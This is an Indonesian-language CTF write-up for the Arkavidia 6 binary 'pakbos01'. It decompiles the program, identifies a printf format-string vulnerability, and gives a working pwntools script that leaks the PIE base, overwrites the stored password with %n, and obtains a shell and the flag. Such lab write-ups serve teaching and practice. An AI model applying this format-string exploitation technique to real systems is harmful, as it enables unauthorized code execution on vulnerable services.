---
layout: post
title:  "[RE] pakbos01 - Arkavidia 6"
date:   2020-01-09 05:00:00
categories: ctf arkavidia
---
## Analisa
```
> file pakbos01
pakbos01: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b067cc44e7cbe574f09780360378eaec3d5c200e, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Tampilan program ketika dijalankan.
![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss1.png)  

Langsung disassemble dan decompile dengan bantuan ghidra.

Fungsi main hanya memanggil fungsi `intro` dan `vuln`
```c
undefined8 main(void)
{
  intro();
  vuln();
  return 0;
}
```

`intro` hanya menampilkan banner. Sementara fungsi vuln setelah didecompile menjadi sebagai berikut
```c
void vuln(void)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("username: PakBos");
  do {
    while( true ) {
      printf("password: ");
      __isoc99_scanf(&DAT_00100c53,local_38);
      iVar1 = strcmp(password,local_38);
      if (iVar1 != 0) break;
      puts("welcome PakBos!");
      win();
    }
    printf(local_38);
    puts("? that is definitely not my password!");
  } while( true );
}
```

Input berupa password kita dibandingkan dengan variable `password`, yang setelah dicek nilainya adalah 'pak bos <3 jennie blackpink'. 

Apabila password kita sesuai, fungsi `win` akan dipanggil, yang mana akan memberikan kita shell
```c
void win(void)
{
  system(shelly);
  return;
}
```

```c
__isoc99_scanf(&DAT_00100c53,local_38);
```
Nilai &DAT_00100c53 adalah '%31s'. Permasalahannya disini, input kita diambil dengan scanf dengan argumen type modifier '%31s' dengan demikian scanf akan berhenti membaca ketika menemukan whitespace.

Jika dilihat pada fungsi vuln, terdapat format string vulnerability karena apabila input kita tidak sesuai dengan password yang diinginkan, akan dilakukan
pemanggilan fungsi printf dengan argumen input kita tanpa disertai format string.
```c
printf(local_38);
```

Coba konfirmasi menggunakan payload sederhana '%p.%p.%p.%p.%p.%p.%p.%p.'

![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss2.png)

Terlihat sequence 0x70252e70252e7025 ('%p.') mulai terlihat pada argumen ke-6 dari printf. 

Dengan demikian, skema eksploitasi yang terpikirkan adalah sebagai berikut:
 1. Leak address program (karena adanya PIE)
 2. Kalkulasi letak password yang tersimpan pada program (dengan acuan  address tadi)
 3. Lakukan overwrite isi dari alamat menggunakan fungsionalitas printf sehingga password berubah jadi tidak ada white-space nya
 4. Isikan password sesuai dengan password yang baru

Sekarang kita perlu mencari tahu address program apa yang ada distack ketika fungsi printf akan dipanggil.

![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss3.png)

Terlihat ada `0x0000555555554700`, pada alamat `input + 17` atau dengan kata lain address ini akan menjadi argumen ke-9 dari printf, yang kebetulan nilai tersebut adalah entry point program.

![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss4.png)

![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss5.png)

Setelah dicek di gdb, password ada pada address `0x555555756040`.

Dengan demikian, kita cukup leak entry point program, hitung jaraknya dengan address password, lalu overwrite password.

Sambil mengganti isi password, kita masukkan karakter 'a' sebanyak 4 kali (yang akan menjadi password baru adalah panjang dari input yang kita masukkan, dalam hal ini 4)


## Solve
```py
from pwn import *
# r = remote('3.0.19.78', 10001)
r = process('./pakbos01')         # lokal
print r.recvuntil('password: ')
r.sendline('%24$p')
base = int(r.recvuntil('?')[2:-1],16)
jarak = 0x555555756040 - 0x0000555555554700
addr_pw = base+jarak
print 'Base = ' + hex(base)
print 'addr_pw = ' + hex(addr_pw)
r.recvuntil('password: ')
r.sendline('aaaa%7$n'+p64(addr_pw))
r.recvuntil('password: ')
r.sendline('\x04')
r.interactive()
r.close()
```

Jalankan di local 
![](/assets/CTF/2020/Arkavidia%206/Pwn/pakbos01/ss/ss6.png)

```
$ cat fl* ru*
Arkav6{jennie_blackpink_gaksuka_pakbos}#!/bin/sh
socat -T10 tcp-l:10099,reuseaddr,fork exec:"timeout -s 9 10 ./pakbos01"
```

## Flag
Arkav6{jennie_blackpink_gaksuka_pakbos}